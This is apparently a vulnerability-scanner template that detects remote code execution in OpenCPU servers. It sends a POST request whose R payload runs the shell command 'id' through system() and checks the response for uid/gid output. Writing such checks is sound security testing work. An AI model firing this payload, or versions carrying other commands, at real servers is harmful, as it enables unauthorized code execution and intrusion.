id: opencpu-rce
info:
  name: OpenCPU - Remote Code Execution
  author: wa1tf0rme
  severity: critical
  description: |
    Check for remote code execution via OpenCPU was conducted.
  reference:
    - https://pulsesecurity.co.nz/articles/R-Shells
    - https://github.com/opencpu/opencpu/
  classification:
    cwe-id:
      - CWE-78
      - CWE-95
  metadata:
    max-request: 1
  tags: opencpu,oss,rce,vuln
http:
  - body: |
      what=function(x){  return(system(paste('id'), intern %3d T))}&args={}
    extractors:
      - group: 1
        regex:
          - \(([a-z-]+)\)
        type: regex
    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - condition: and
        type: word
        words:
          - uid=
          - gid=
      - status:
          - 201
        type: status
    matchers-condition: and
    max-redirects: 2
    method: POST
    path:
      - '{{BaseURL}}/ocpu/library/base/R/do.call/json'
    redirects: true
